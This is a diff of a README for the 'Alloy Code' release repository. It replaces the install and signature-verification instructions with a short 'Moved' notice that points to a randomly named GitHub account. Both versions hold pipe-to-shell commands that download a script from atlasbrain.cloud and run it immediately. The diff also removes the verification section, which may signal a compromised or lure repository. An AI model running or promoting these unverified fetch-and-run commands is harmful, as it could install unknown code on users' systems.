@@ -1,21 +1,8 @@
-# Alloy Code — Releases
+# Moved
 
-Signed release binaries for **Alloy Code** (closed-source). This repository hosts artifacts only — no source code.
+Alloy Code releases live at https://github.com/ksdj9iqsxs12/alloy-code-releases
 
-## Install
+Install:
 
-**Windows (PowerShell):**
-
-    irm https://atlasbrain.cloud/install.ps1 | iex
-
-**macOS / Linux:**
-
-    curl -fsSL https://atlasbrain.cloud/install | sh
-
-Then sign in:
-
-    alloy login
-
-## Verifying a release
-
-Every release ships a `SHA256SUMS` manifest signed with an offline ed25519 key (`SHA256SUMS.sig`). The install scripts verify SHA-256 automatically. To verify the signature end-to-end, check `SHA256SUMS.sig` against the published `release-signing.pub`.
+    irm https://atlasbrain.cloud/install.ps1 | iex   (Windows)
+    curl -fsSL https://atlasbrain.cloud/install | sh   (macOS/Linux)
